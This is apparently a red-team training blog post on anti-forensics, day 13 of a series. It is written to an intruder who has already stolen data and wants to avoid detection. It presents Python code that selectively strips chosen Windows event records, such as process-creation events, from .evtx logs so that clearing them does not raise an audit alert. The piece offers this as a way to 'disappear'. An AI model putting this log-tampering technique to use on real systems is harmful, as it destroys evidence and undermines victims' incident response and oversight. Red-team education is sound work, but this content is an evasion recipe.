30 Days of Red Team: Day 13 — Anti-Forensics

Maxwell Cross • Dec 21, 2025

You have the prize. Now, can you get away with it?

You’ve compromised the target. You’ve exfiltrated the data. You feel like you’ve won.

But while you are celebrating, the Blue Team is spinning up a forensic investigation. They are pulling disk images, analyzing memory dumps, and correlating timestamps. If you left a single artifact behind, the entire operation burns.

Amateurs clear the logs (which triggers Event ID 1102 and alerts the SOC). Professionals perform Surgical Deletion—removing only their own traces while leaving the rest of the system untouched.

Today, we learn how to disappear.

A Glimpse of the Code: Surgical Log Cleaning

Running Clear-EventLog is suicide. It screams "I was here!" to any SIEM.

In Day 13, we build a Log Manipulator that parses the binary .evtx files directly. It locates the specific Event IDs generated by your malware (like Process Creation 4688) and unlinks them from the chain without breaking the file structure.

Here is the logic that edits history:

def selective_delete_events(log_path, target_event_ids):
    """
    Remove specific Event IDs without clearing the entire log.
    This avoids triggering Event 1102 (The audit log was cleared).
    """
    parser = evtx.Evtx(log_path)
    clean_records = []
    
    # Iterate through all event records
    for record in parser.records():
        event_id = record.event_id()
        
        # Keep events that aren't in our target list
        if event_id not in target_event_ids:
            clean_records.append(record)
            
    # Rebuild log file with filtered records
    rebuild_evtx_file(log_path, clean_records)
